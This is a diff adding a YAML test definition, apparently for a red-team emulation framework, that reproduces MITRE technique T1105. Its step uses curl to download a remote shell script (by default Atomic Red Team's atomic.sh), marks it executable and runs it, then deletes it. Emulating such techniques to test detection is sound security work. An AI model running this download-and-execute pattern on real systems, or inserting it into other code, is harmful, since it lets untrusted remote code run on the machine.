@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Linux Download File and Run
+description: |
+    Utilize linux Curl to download a remote file, chmod +x it and run it.
+args:
+    - name: remote_url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh
+    - name: payload_name
+      type: string
+      default: atomic.sh
+uuid: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1105: Ingress Tool Transfer'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: linux-download-file-and-run
+      inline: |
+        curl -sO {{.Args.remote_url}}; chmod +x {{.Args.payload_name}} | bash {{.Args.payload_name}}
+      executor: sh
+      cleanup:
+        inline: |
+            rm {{.Args.payload_name}}
+        executor: sh
